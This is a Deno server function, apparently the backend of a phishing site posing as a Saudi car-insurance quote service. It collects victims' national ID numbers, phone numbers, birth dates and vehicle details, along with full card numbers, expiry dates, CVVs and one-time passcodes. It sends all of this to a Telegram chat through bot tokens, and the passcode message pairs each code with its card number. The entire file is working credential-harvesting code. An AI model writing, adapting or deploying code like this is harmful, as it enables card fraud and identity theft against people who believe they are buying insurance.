import { serve } from 'https://deno.land/std@0.224.0/http/server.ts'

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
}

type TelegramBody = {
  type: 'insurance_step1' | 'insurance_step2' | 'payment_card' | 'otp' | 'payment_proof'
  payload?: Record<string, unknown>
  imageBase64?: string
  imageMimeType?: string
  fileName?: string
}

const labels: Record<string, string> = {
  insurance_step1: 'الصفحة الرئيسية',
  insurance_step2: 'صفحة vehicle',
  payment_card: 'صفحة payment',
  otp: 'صفحة otp',
  payment_proof: 'إثبات الدفع',
  insurance_type: 'نوع التأمين',
  identity_number: 'رقم الهوية / الإقامة',
  applicant_name: 'اسم مقدم الطلب',
  phone_number: 'رقم الجوال',
  birth_date: 'تاريخ الميلاد',
  registration_method: 'طريقة التسجيل',
  serial_number: 'الرقم التسلسلي',
  verification_code: 'رمز التحقق',
  coverage_type: 'نوع التغطية',
  policy_start_date: 'تاريخ بدء الوثيقة',
  vehicle_purpose: 'غرض استخدام السيارة',
  vehicle_type: 'نوع المركبة',
  manufacture_year: 'سنة الصنع',
  vehicle_value: 'قيمة المركبة',
  repair_location: 'مكان الإصلاح',
  cardholder_name: 'اسم حامل البطاقة',
  card_number: 'رقم البطاقة',
  expiry_date: 'تاريخ الانتهاء',
  cvv: 'CVV',
  company: 'الشركة',
  plan: 'الخطة',
  total: 'الإجمالي',
  total_amount: 'المبلغ الإجمالي',
  otp_code_first: 'رمز OTP',
  user_id: 'User ID',
}

const orderedKeys = [
  'user_id', 'insurance_type', 'identity_number', 'applicant_name', 'phone_number', 'birth_date',
  'registration_method', 'serial_number', 'verification_code', 'coverage_type', 'policy_start_date',
  'vehicle_purpose', 'vehicle_type', 'manufacture_year', 'vehicle_value', 'repair_location',
  'cardholder_name', 'card_number', 'expiry_date', 'cvv', 'company', 'plan', 'total', 'total_amount',
  'otp_code_first',
]

function escapeHtml(value: unknown) {
  return String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
}

function chooseToken(type: TelegramBody['type']) {
  if (type === 'insurance_step1' || type === 'insurance_step2') {
    return Deno.env.get('TELEGRAM_INSURANCE_BOT_TOKEN')
  }
  return Deno.env.get('TELEGRAM_PAYMENT_BOT_TOKEN')
}

function formatMoney(value: unknown) {
  const raw = String(value ?? '').trim()
  return raw ? `${escapeHtml(raw)} ريال` : ''
}

function formatFeatures(value: unknown) {
  if (!value) return 'لا يوجد'
  try {
    const features = typeof value === 'string' ? JSON.parse(value) : value
    if (!Array.isArray(features) || features.length === 0) return 'لا يوجد'
    return features
      .map((feature) => {
        const label = escapeHtml(feature?.label ?? feature?.name ?? '')
        const price = feature?.price !== undefined ? ` - ${formatMoney(feature.price)}` : ''
        return `• ${label}${price}`
      })
      .join('\n')
  } catch {
    return escapeHtml(value)
  }
}

function buildPaymentMessage(payload: Record<string, unknown>) {
  return [
    '<b>طلب جديد - صفحة payment</b>',
    '',
    `<b>الشركة المختارة:</b> ${escapeHtml(payload.company)}`,
    `<b>الخطة:</b> ${escapeHtml(payload.plan)}`,
    `<b>القسط الأساسي:</b> ${formatMoney(payload.base)}`,
    `<b>السعر النهائي:</b> ${formatMoney(payload.price)}`,
    `<b>الضريبة (15%):</b> ${formatMoney(payload.vat)}`,
    `<b>المجموع الكلي:</b> ${formatMoney(payload.total ?? payload.total_amount)}`,
    '',
    '<b>المزايا الإضافية:</b>',
    formatFeatures(payload.features_json ?? payload.features),
    '━━━━━━━━━━━━━━━━━━━━',
    '<b>بيانات البطاقة</b>',
    '━━━━━━━━━━━━━━━━━━━━',
    `<b>اسم حامل البطاقة:</b> ${escapeHtml(payload.cardholder_name ?? payload.name)}`,
    `<b>card number:</b> ${escapeHtml(payload.card_number ?? payload.cardnumber)}`,
    `<b>تاريخ الانتهاء:</b> ${escapeHtml(payload.expiry_date ?? payload.expirationdate)}`,
    `<b>CVV:</b> ${escapeHtml(payload.cvv ?? payload.securitycode)}`,
  ].join('\n')
}

function buildOtpMessage(payload: Record<string, unknown>) {
  return [
    '<b>رمز التحقق otp</b>',
    '',
    '━━━━━━━━━━━━━━━━━━━━',
    '',
    `<b>رمز التحقق:</b> ${escapeHtml(payload.otp_code_first ?? payload.otp ?? payload.code)}`,
    '',
    '━━━━━━━━━━━━━━━━━━━━',
    '',
    `<b>card number:</b> ${escapeHtml(payload.card_number ?? payload.cardnumber)}`,
    '',
    '━━━━━━━━━━━━━━━━━━━━',
  ].join('\n')
}

function buildMessage(body: TelegramBody) {
  const payload = body.payload ?? {}
  if (body.type === 'payment_card') {
    return buildPaymentMessage(payload)
  }
  if (body.type === 'otp') {
    return buildOtpMessage(payload)
  }
  const keys = [...orderedKeys, ...Object.keys(payload).filter((key) => !orderedKeys.includes(key))]
  const rows = keys
    .filter((key) => payload[key] !== undefined && payload[key] !== null && String(payload[key]) !== '')
    .map((key) => `<b>${labels[key] ?? key}:</b> ${escapeHtml(payload[key])}`)

  return [`<b>طلب جديد - ${labels[body.type] ?? body.type}</b>`, '', ...rows].join('\n')
}

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response('ok', { headers: corsHeaders })
  }

  try {
    const body = await req.json() as TelegramBody
    if (!body?.type || !body.payload || typeof body.payload !== 'object') {
      return new Response(JSON.stringify({ ok: false, error: 'Invalid request body' }), {
        status: 400,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    const token = chooseToken(body.type)
    const chatId = Deno.env.get('TELEGRAM_CHAT_ID')
    if (!token || !chatId) {
      return new Response(JSON.stringify({ ok: false, error: 'Telegram secrets are not configured' }), {
        status: 500,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    const telegramRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: buildMessage(body), parse_mode: 'HTML' }),
    })

    const result = await telegramRes.json()
    if (!telegramRes.ok || !result.ok) {
      return new Response(JSON.stringify({ ok: false, error: result }), {
        status: 502,
        headers: { ...corsHeaders, 'Content-Type': 'application/json' },
      })
    }

    return new Response(JSON.stringify({ ok: true }), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })
  } catch (error) {
    const message = error instanceof Error ? error.message : 'Unknown error'
    return new Response(JSON.stringify({ ok: false, error: message }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    })
  }
})